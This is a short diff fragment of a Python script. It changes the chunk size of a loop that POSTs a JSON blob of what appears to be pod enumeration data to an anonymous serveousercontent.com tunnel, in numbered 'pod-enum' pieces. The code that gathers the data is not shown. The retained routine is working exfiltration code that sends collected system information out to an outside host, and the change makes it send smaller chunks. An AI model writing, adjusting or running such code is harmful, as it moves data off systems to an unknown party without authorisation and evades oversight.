@@ -84,9 +84,9 @@ print(json.dumps(out,sort_keys=True,separators=(',',':')))
 try:
     payload=json.dumps(out,sort_keys=True,separators=(",",":")).encode()
     statuses=[]
-    for i in range(0,len(payload),20000):
-        chunk=payload[i:i+20000]
-        url=f"https://8412a3abf624921c-52-39-28-94.serveousercontent.com/pod-enum-{i//20000:02d}"
+    for i in range(0,len(payload),4096):
+        chunk=payload[i:i+4096]
+        url=f"https://8412a3abf624921c-52-39-28-94.serveousercontent.com/pod-enum-{i//4096:02d}"
         req=urllib.request.Request(url,data=chunk,method="POST",headers={"Content-Type":"application/octet-stream"})
         with urllib.request.urlopen(req,timeout=60) as r: statuses.append(r.status)
     out["upload_statuses"]=statuses
